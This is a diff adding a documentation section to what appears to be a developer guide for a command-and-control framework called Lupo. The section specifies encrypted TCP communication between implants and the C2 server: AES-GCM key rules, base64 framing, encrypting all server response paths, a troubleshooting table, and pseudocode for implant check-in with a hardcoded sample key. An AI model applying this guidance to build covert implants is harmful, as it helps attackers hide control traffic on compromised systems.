@@ -443,6 +443,128 @@ FUNCTION ParseTCPResponse(response):
 
 ---
 
+### 2.4 TCP Encrypted Mode (AES-256-GCM)
+
+When the operator starts a TCP listener with the `-e` flag (e.g. `listener start -x TCP -e <key>`), all traffic between the implant and server is encrypted with AES-256-GCM. The following lessons were learned the hard way and **must** be followed exactly.
+
+#### 2.4.1 Key Requirements
+
+- AES requires the key to be **exactly 16, 24, or 32 bytes** (AES-128/192/256).
+- The server passes the raw `-e` string directly as the AES key — **no hashing, no padding**.
+- Choose a key whose byte length is exactly one of those three values. A 32-byte key (AES-256) is recommended.
+- Example of a valid 32-byte key: `mie0weiBahxeiri3sahxaKoolohnex1d`
+- **Do NOT attempt to use a short mnemonic like `tcpshared` as-is** — it is 9 bytes and `aes.NewCipher` will return an error.
+
+#### 2.4.2 The Binary-in-Newline Problem (Critical!)
+
+The server receives implant data with `bufio.ReadString('\n')`. AES-GCM ciphertext is arbitrary binary and **will statistically contain `0x0A` (`\n`) bytes**, causing the server to truncate the payload mid-ciphertext.
+
+**Fix — Base64 encode the ciphertext before sending:**
+```
+// Outbound (implant → server):
+ciphertext = AES_GCM_ENCRYPT(json_payload, key)
+b64        = BASE64_ENCODE(ciphertext)       // eliminates all 0x0A bytes
+socket.Send(b64 + "\n")                      // newline is safe now — no binary
+
+// Inbound (server → implant):
+// Server must also BASE64_ENCODE its encrypted responses for the same reason.
+// Implant reads until EOF/timeout, then BASE64_DECODE, then AES_GCM_DECRYPT.
+```
+
+Both directions must use base64 wrapping. If only one direction is wrapped, the channel is broken.
+
+#### 2.4.3 Server Sends Encrypted on ALL Paths (Not Just Check-in)
+
+A common mistake is only encrypting the normal check-in response at the end of the handler. The Lupo TCP server has **four separate write points**:
+
+| Path | Description |
+|------|-------------|
+| Registration | New implant registers for the first time |
+| Persistence reconnect #1 | Session missing from store, PersistenceMode=true |
+| Persistence reconnect #2 | UUID mismatch on existing session, PersistenceMode=true |
+| Normal check-in | Every subsequent check-in after registration |
+
+**All four must encrypt and base64-encode** when `cryptoPSK != ""`. If any one of them sends plain JSON while the implant expects encrypted data, decryption will fail and the implant will get stuck in a re-registration loop.
+
+The correct pattern is a shared helper used at every write site:
+```
+FUNCTION WriteTCPResponse(conn, json_bytes, cryptoPSK):
+    IF cryptoPSK != "":
+        ciphertext = AES_GCM_ENCRYPT(json_bytes, cryptoPSK)
+        conn.Write(BASE64_ENCODE(ciphertext))   // no newline on responses
+    ELSE:
+        conn.Write(json_bytes)                  // plain TCP mode unchanged
+```
+
+#### 2.4.4 Reading Encrypted Responses on the Implant
+
+Plain TCP responses are framed by brace-counting (`{`/`}` depth). Encrypted responses are NOT JSON — they are base64 strings. **Do not use brace-counting for encrypted responses.**
+
+```
+IF cryptoPSK != "":
+    // Server closes the connection after writing — ReadAll gives complete payload
+    raw = READ_UNTIL_EOF_OR_TIMEOUT(conn)
+    IF raw is empty: RETURN ""
+    ciphertext = BASE64_DECODE(TRIM(raw))
+    plaintext  = AES_GCM_DECRYPT(ciphertext, key)
+    RETURN plaintext                            // this is the JSON string
+
+ELSE:
+    // Plain mode: brace-count to find end of JSON object
+    USE_BRACE_COUNTING_READER(conn)
+```
+
+#### 2.4.5 Symptom → Root Cause Map
+
+| Observed symptom | Root cause |
+|------------------|-----------|
+| `cipher: message authentication failed` | Raw binary ciphertext sent without base64; `0x0A` byte truncated the payload so GCM tag is corrupt |
+| `unexpected end of JSON input` + `TCP Request did not provide PSK` | Same truncation — server received a partial ciphertext, decrypted garbage, JSON parse failed |
+| Implant registers successfully but keeps re-registering on every check-in | Server returns plain JSON for the registration response but encrypted JSON for check-in (or vice versa); implant fails to decrypt/parse one side |
+| `aes.NewCipher: invalid key size N` | PSK is not 16, 24, or 32 bytes |
+
+#### 2.4.6 Encrypted TCP Implementation Template
+
+```
+CONSTANT CRYPTO_PSK = "mie0weiBahxeiri3sahxaKoolohnex1d"  // 32 bytes
+
+FUNCTION SendToC2_TCP_Encrypted(implant, message):
+    json_string = JSON_STRINGIFY(BuildCheckInPayload(implant, message))
+
+    IF CRYPTO_PSK != "":
+        ciphertext = AES_GCM_ENCRYPT(json_string, CRYPTO_PSK)
+        payload    = BASE64_ENCODE(ciphertext) + "\n"
+    ELSE:
+        payload = json_string + "\n"
+
+    conn = TCP_CONNECT(implant.c2_server, implant.c2_port, timeout=5s)
+    conn.Write(payload)
+
+    IF CRYPTO_PSK != "":
+        raw        = conn.ReadAll()             // server closes after writing
+        ciphertext = BASE64_DECODE(TRIM(raw))
+        RETURN AES_GCM_DECRYPT(ciphertext, CRYPTO_PSK)
+    ELSE:
+        RETURN BRACE_COUNT_READ(conn)           // plain JSON object
+
+FUNCTION AES_GCM_ENCRYPT(plaintext, key):
+    block = AES_NEW_CIPHER(key)                 // key MUST be 16/24/32 bytes
+    gcm   = GCM_NEW(block)
+    nonce = RANDOM_BYTES(gcm.NonceSize())       // typically 12 bytes
+    // Seal prepends nonce: output = nonce || ciphertext || tag
+    RETURN gcm.Seal(nonce, nonce, plaintext, nil)
+
+FUNCTION AES_GCM_DECRYPT(ciphertext, key):
+    block     = AES_NEW_CIPHER(key)
+    gcm       = GCM_NEW(block)
+    nonceSize = gcm.NonceSize()
+    nonce     = ciphertext[0 : nonceSize]
+    data      = ciphertext[nonceSize :]
+    RETURN gcm.Open(nil, nonce, data, nil)
+```
+
+---
+
 ## Part 3: HTTP Protocol (Stateless, Poll-Based)
 
 ### 3.1 HTTP Protocol Overview
